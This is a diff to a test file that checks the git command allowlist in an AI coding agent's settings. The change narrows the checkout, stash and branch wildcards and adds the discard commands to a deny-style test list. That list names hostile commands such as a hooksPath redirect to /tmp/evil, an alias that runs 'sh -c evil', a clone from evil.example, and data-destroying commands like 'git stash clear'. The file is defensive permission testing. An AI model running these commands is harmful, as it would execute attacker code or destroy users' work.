@@ -14,6 +14,10 @@
  * FAILING-BEFORE / PASSING-AFTER: pre-fix "Bash(git *)" is present and matches
  * all three dangerous commands → assertions (a)/(c) FAIL; post-fix it is gone
  * and the 15 explicit safe verbs are present → assertions PASS.
+ *
+ * WI-15 W2: checkout/stash/branch wildcards were narrowed to their safe forms
+ * (18 entries). The discard forms now fall through to a prompt, and the
+ * bash-guard evaluator asks for them in every permission mode.
  */
 
 import { describe, it, expect } from 'vitest';
@@ -32,10 +36,13 @@ const EXPECTED_SAFE_GIT_ALLOW = [
   'Bash(git commit:*)',
   'Bash(git push)',
   'Bash(git branch)',
-  'Bash(git branch:*)',
-  'Bash(git checkout:*)',
+  'Bash(git branch --list:*)',
+  'Bash(git branch --show-current)',
+  'Bash(git checkout -b:*)',
+  'Bash(git checkout main)',
   'Bash(git merge:*)',
-  'Bash(git stash:*)',
+  'Bash(git stash list)',
+  'Bash(git stash push:*)',
   'Bash(git rev-parse:*)',
   'Bash(git ls-files:*)',
   'Bash(git check-ignore:*)',
@@ -46,6 +53,12 @@ const DANGEROUS_GIT_COMMANDS = [
   'git -c core.hooksPath=/tmp/evil commit -m x',
   'git config --global alias.pwn "!sh -c evil"',
   'git clone https://evil.example/repo.git',
+  // WI-15 W2: discard forms that the old checkout/stash/branch wildcards pre-approved.
+  'git checkout -- .',
+  'git checkout .',
+  'git stash drop',
+  'git stash clear',
+  'git branch -D feature',
 ];
 
 /**
@@ -81,13 +94,13 @@ describe('.claude/settings.json — git allowlist narrowing (P5.2)', () => {
     expect(allow).not.toContain('Bash(git:*)');
   });
 
-  it('(b) contains all 15 explicit safe-git allow entries', () => {
+  it('(b) contains all 18 explicit safe-git allow entries', () => {
     for (const entry of EXPECTED_SAFE_GIT_ALLOW) {
       expect(allow).toContain(entry);
     }
   });
 
-  it('(c) no allow entry auto-approves git -c / git config / git clone', () => {
+  it('(c) no allow entry auto-approves git -c / config / clone or a W2 discard form', () => {
     for (const cmd of DANGEROUS_GIT_COMMANDS) {
       const matching = allow.filter((p) => bashPatternMatches(p, cmd));
       expect(matching, `command "${cmd}" auto-approved by ${JSON.stringify(matching)}`).toEqual([]);
@@ -95,7 +108,8 @@ describe('.claude/settings.json — git allowlist narrowing (P5.2)', () => {
   });
 
   it('(c2) explicitly bans the known catch-all git patterns', () => {
-    for (const banned of ['Bash(git *)', 'Bash(git:*)', 'Bash(git -c:*)', 'Bash(git config:*)', 'Bash(git clone:*)']) {
+    for (const banned of ['Bash(git *)', 'Bash(git:*)', 'Bash(git -c:*)', 'Bash(git config:*)', 'Bash(git clone:*)',
+      'Bash(git checkout:*)', 'Bash(git stash:*)', 'Bash(git branch:*)', 'Bash(git restore:*)']) {
       expect(allow).not.toContain(banned);
     }
   });
@@ -105,6 +119,8 @@ describe('.claude/settings.json — git allowlist narrowing (P5.2)', () => {
     expect(allow.some((p) => bashPatternMatches(p, 'git checkout -b feature'))).toBe(true);
     expect(allow.some((p) => bashPatternMatches(p, 'git merge --no-ff feature'))).toBe(true);
     expect(allow.some((p) => bashPatternMatches(p, 'git branch'))).toBe(true);
+    expect(allow.some((p) => bashPatternMatches(p, 'git checkout main'))).toBe(true);
+    expect(allow.some((p) => bashPatternMatches(p, 'git stash push -m wip'))).toBe(true);
     expect(allow.some((p) => bashPatternMatches(p, 'git commit -m x'))).toBe(true);
     expect(allow.some((p) => bashPatternMatches(p, 'git push'))).toBe(true);
   });
@@ -118,13 +134,13 @@ describe('.claude/settings.full.json — same git allowlist narrowing (P5.2)', (
     expect(allow).not.toContain('Bash(git *)');
   });
 
-  it('contains all 15 explicit safe-git allow entries', () => {
+  it('contains all 18 explicit safe-git allow entries', () => {
     for (const entry of EXPECTED_SAFE_GIT_ALLOW) {
       expect(allow).toContain(entry);
     }
   });
 
-  it('no allow entry auto-approves git -c / git config / git clone', () => {
+  it('no allow entry auto-approves git -c / config / clone or a W2 discard form', () => {
     for (const cmd of DANGEROUS_GIT_COMMANDS) {
       const matching = allow.filter((p) => bashPatternMatches(p, cmd));
       expect(matching, `command "${cmd}" auto-approved by ${JSON.stringify(matching)}`).toEqual([]);
